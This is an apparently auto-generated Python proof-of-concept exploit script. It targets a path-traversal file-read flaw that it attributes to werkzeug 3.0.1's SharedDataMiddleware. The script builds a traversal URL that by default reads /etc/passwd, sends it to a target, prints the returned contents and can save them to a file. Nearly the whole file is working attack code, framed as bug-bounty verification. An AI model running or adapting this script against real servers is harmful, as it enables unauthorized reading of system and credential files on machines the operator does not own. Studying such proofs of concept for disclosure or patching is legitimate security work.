#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: lfi-025
# Sink: _opener
# Auto-generated — run with: python3 lfi_url_mapping__opener.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in werkzeug 3.0.1
SharedDataMiddleware.

Vulnerability: The _opener function in SharedDataMiddleware directly opens a file
using the 'filename' parameter without any path traversal protection. The filename
originates from user-controlled URL path mapping, allowing an attacker to use '../'
sequences to read arbitrary files outside the intended static directory.

This PoC demonstrates reading /etc/passwd as a benign proof of arbitrary file read.
"""

import sys
import requests
import argparse
from urllib.parse import urljoin

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:5000"
# Benign payload to demonstrate LFI - reads /etc/passwd
DEFAULT_PAYLOAD = "/static/../../../../../../etc/passwd"


def exploit_lfi(target_url, payload_path):
    """
    Attempt to exploit the LFI vulnerability in werkzeug's SharedDataMiddleware.
    
    Args:
        target_url: Base URL of the vulnerable application
        payload_path: Path traversal payload (e.g., /static/../../../etc/passwd)
    
    Returns:
        Response content if successful, None otherwise
    """
    # Construct the full URL with the path traversal payload
    exploit_url = urljoin(target_url.rstrip('/') + '/', payload_path.lstrip('/'))
    
    print(f"[*] Attempting LFI exploit...")
    print(f"[*] Target URL: {exploit_url}")
    
    try:
        # Send GET request with the path traversal payload
        response = requests.get(
            exploit_url,
            timeout=10,
            allow_redirects=False,
            headers={
                "User-Agent": "Mozilla/5.0 (PoC Exploit)"
            }
        )
        
        # Check if we got a successful response (200 OK)
        if response.status_code == 200:
            print(f"[+] SUCCESS! Got 200 OK response")
            print(f"[+] Response length: {len(response.content)} bytes")
            print(f"[+] Content preview (first 500 bytes):")
            print("-" * 60)
            print(response.text[:500])
            print("-" * 60)
            return response.text
        elif response.status_code == 404:
            print(f"[-] Got 404 Not Found - file may not exist or path traversal blocked")
        elif response.status_code == 403:
            print(f"[-] Got 403 Forbidden - access denied")
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error - is the target server running?")
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    
    return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug 3.0.1 SharedDataMiddleware LFI vulnerability"
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-p", "--payload",
        default=DEFAULT_PAYLOAD,
        help=f"Path traversal payload (default: {DEFAULT_PAYLOAD})"
    )
    parser.add_argument(
        "-o", "--output",
        help="Save response to file (optional)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Werkzeug 3.0.1 SharedDataMiddleware LFI PoC")
    print("=" * 60)
    print()
    
    result = exploit_lfi(args.target, args.payload)
    
    if result and args.output:
        try:
            with open(args.output, 'w') as f:
                f.write(result)
            print(f"[+] Response saved to {args.output}")
        except IOError as e:
            print(f"[-] Failed to save output: {e}")
    
    if result:
        print("\n[+] Exploit successful! The vulnerability is confirmed.")
        print("[+] This demonstrates arbitrary file read via path traversal.")
        print("[!] In a real attack, an attacker could read sensitive files.")
        return 0
    else:
        print("\n[-] Exploit failed. Possible reasons:")
        print("  - Target is not running werkzeug with SharedDataMiddleware")
        print("  - Path traversal is blocked by other middleware")
        print("  - The payload path doesn't exist on the target")
        return 1


if __name__ == "__main__":
    sys.exit(main())
